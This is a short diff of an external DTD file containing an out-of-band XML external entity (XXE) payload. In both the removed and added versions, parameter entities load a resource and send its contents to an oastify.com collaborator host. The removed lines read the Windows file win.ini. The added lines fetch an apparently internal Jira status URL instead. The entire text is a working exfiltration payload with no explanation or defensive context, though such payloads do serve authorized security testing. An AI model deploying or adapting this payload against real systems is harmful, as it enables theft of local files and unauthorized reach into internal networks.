@@ -1,4 +1,4 @@
-<!ENTITY % file SYSTEM "file:///c:\windows\win.ini">
-<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'https://k2n25pqn67tj0b89m51b5qpqlhr8fy3n.oastify.com/exfil?xxe=%file;'>">
+<!ENTITY % file SYSTEM "https://jira.elliemae.io/status">
+<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'https://ej1u9b4qk69aq52ggzi5v09j1a71vsjh.oastify.com/exfil?xxe=%file;'>">
 %eval;
 %exfiltrate;
